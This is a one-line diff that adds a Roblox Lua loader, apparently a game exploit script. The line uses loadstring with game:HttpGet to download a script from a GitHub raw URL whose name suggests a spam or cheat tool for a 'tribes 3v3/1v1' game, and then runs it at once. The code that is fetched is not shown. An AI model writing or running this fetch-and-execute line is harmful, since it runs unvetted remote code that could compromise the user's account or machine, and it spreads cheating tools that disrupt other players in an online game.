@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/tribes-3v3-1v1-added-spam7-fr44vsuzoegk0t.lua"))()
